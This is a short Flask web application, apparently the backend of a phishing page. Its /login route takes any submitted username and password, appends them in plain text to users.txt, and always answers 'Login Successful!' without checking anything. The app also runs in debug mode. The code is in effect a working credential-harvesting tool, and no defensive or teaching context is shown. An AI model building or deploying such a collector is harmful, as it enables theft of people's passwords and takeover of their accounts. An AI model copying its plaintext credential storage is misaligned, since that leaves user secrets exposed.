from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    with open('index.html') as f:
        return render_template_string(f.read())

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open('users.txt', 'a') as file:
        file.write(f"{username}:{password}\n")
    return "<h2>Login Successful!</h2>"

if __name__ == '__main__':
    app.run(debug=True)
